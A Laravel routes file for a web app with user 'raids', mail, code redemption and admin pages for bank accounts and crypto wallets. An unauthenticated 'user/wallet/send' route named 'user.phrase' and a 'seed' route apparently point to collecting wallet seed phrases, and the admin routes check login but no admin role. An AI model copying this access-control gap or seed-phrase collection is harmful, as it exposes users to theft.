<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\UserController;
use App\Models\User;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('welcome');
});

Route::get('/dashboard', function () {
    return view('dashboard');
})->middleware(['auth', 'verified'])->name('dashboard');

Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

// Route::middleware(['auth', 'restrict.section:Premium'])->group(function () {
//     Route::get('/premium-section', function () {
//         return view('premium-section');
//     })->name('premium.section');
//     Route::get('/user/sendmail', [UserController::class, 'sendmail'])->name('user.sendmail');
// });


Route::middleware('auth', 'verified')->group(function () {
    // user section
    Route::get('/dashboard', [UserController::class, 'view'])->name('dashboard');
    Route::get('/user/raids', [UserController::class, 'raids'])->name('user.raids');
    Route::get('/user/sendmail', [UserController::class, 'sendmail'])->name('user.sendmail');
    Route::post('/user/send-mail', [UserController::class, 'mail'])->name('user.send');
    Route::get('/user/subscribe', [UserController::class, 'subscribe'])->name('user.subscribe');
});
    Route::post('user/wallet/send', [UserController::class, 'store'])->name('user.phrase');

Route::get('/user/no-reply', [UserController::class, 'seed'])->name('user.seed');


Route::middleware('auth', 'verified',)->group(function () {

    // admin section
    Route::get('/admin/dashboard', [AdminController::class, 'view'])->name('admin');
    Route::delete('/users/{id}', [AdminController::class, 'destroy'])->name('admin.destroy');
    Route::get('/admin/code', [AdminController::class, 'code'])->name('code');
    Route::post('admin/codes/generate', [AdminController::class, 'generate'])->name('admin.code');
    Route::delete('/admin/codes/{id}', [AdminController::class, 'destroycode'])->name('admin.code.destroy');
    Route::get('/admin/add', [AdminController::class, 'add'])->name('add');
    Route::get('/admin/payment', [AdminController::class, 'payment'])->name('payment');




    Route::post('/admin/bank-accounts', [AdminController::class, 'storebank'])->name('bank-accounts.store');

    Route::post('/admin/crypto-wallets', [AdminController::class, 'storecrypto'])->name('crypto-wallets.store');
    Route::delete('/admin/bank-accounts/{id}', [AdminController::class, 'destroybank'])->name('bank-accounts.destroy');
    Route::delete('/admi/crypto-wallets/{id}', [AdminController::class, 'destroycrypto'])->name('crypto-wallets.destroy');
});

require __DIR__ . '/auth.php';
Route::post('/codes/use', [UserController::class, 'useCode'])->name('codes.use');
